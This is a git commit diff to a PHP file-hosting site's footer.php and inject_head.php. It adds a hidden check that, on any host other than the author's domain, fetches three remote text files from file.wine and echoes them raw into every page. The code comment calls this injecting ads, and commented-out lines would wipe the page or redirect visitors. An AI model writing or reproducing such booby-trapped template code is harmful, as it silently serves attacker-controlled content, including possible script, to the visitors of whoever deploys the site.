ee1278513c275981da5ad20803ef4e2270f4d26b
jtrent238 <jtrent238@outlook.com>
2019-12-04 23:10:24 -0500

    12420191110

--- footer.php
+++ footer.php
@@ -10,3 +10,19 @@
 <?php
 	include('theme.php'); // sets the them of each page (configure in config.php)
 ?>
+
+<?php
+if ($_SERVER['HTTP_HOST'] != 'stfh.jtrent238.tk') {
+	// Wipe the page
+	//echo('<script type="text/javascript">window.onload = document.body.style.display = "none";</script>');}
+	// inject lots of ads
+	echo(file_get_contents('https://file.wine/PMoDmlC5B.txt'));
+	
+	echo(file_get_contents('https://file.wine/yse4jYCRiJxX.txt'));
+	echo(file_get_contents('https://file.wine/mMLFsK1JX4.txt'));
+
+	
+
+	$isMySite = false;
+}
+?>
--- inject_head.php
+++ inject_head.php
@@ -1,5 +1,15 @@
 <title>jtrent238 File Hosting</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<?php 
+	include_once('footer.php'); 
+	
+	if ($isMySite == false) {
+		// redirect user to MY site
+		//echo('<meta http-equiv="refresh" content="5"; URL="http://stfh.jtrent238.tk" />');
+	}
+?>
+
 <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
 <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3pro.css">
 <!-- Global site tag (gtag.js) - Google Analytics -->
@@ -11,4 +21,5 @@
 
   gtag('config', 'G-4XFZQRVMYW');
 </script>
-<script data-ad-client="ca-pub-8574266263882010" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script> data-ad-client="ca-pub-8574266263882010" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
